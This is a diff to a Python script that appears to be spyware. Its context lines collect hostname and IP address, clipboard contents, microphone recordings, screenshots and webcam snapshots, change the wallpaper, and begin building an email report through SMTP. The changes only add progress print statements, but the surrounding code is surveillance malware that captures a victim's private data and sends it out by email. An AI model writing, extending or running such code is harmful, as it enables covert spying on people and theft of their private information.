@@ -130,6 +130,8 @@ def system_information():
         f.write("Hostname: " + hostname + '\n')
         f.write("Private IP Address: " + IPAddr + '\n')
 
+        print("system info ok")
+
 # Copy Clipboard Data
 def copy_clipboard():
     print('starting clipboard information')
@@ -140,6 +142,7 @@ def copy_clipboard():
             pasted_data = win32clipboard.GetClipboardData()
             win32clipboard.CloseClipboard()
             f.write("Clipboard Data : \n" + pasted_data + '\n')
+            print("clipboard ok")
         except:
             f.write("Clipboard Could not be copied. \n")
 
@@ -153,12 +156,16 @@ def microphone():
     sd.wait()
     write(audio_info, fs, myrecording)
 
+    print("microphone record ok")
+
 # Get Screenshots
 def screenshots():
     print('starting screenshot information')
 
     im = ImageGrab.grab()
     im.save(screenshot_info)
+
+    print("screenshot ok!")
 
 # Get Snap with WebCamera
 def web_camera():
@@ -172,6 +179,7 @@ def web_camera():
         imwrite(webCamShot_info, image)
         waitKey(1)
         destroyWindow("webCam")
+        print("web camera frame ok!")
 
 def set_wallpaper():
     print("starting changing the wallpaper")
@@ -187,6 +195,8 @@ def set_wallpaper():
     else: print("failed to change wallpaper.")
 
 def send_report():
+    print("starting to send the report")
+
     # Creating the Email Object
     message = MIMEMultipart()
     message["From"] = Config.SMTP_USERNAME
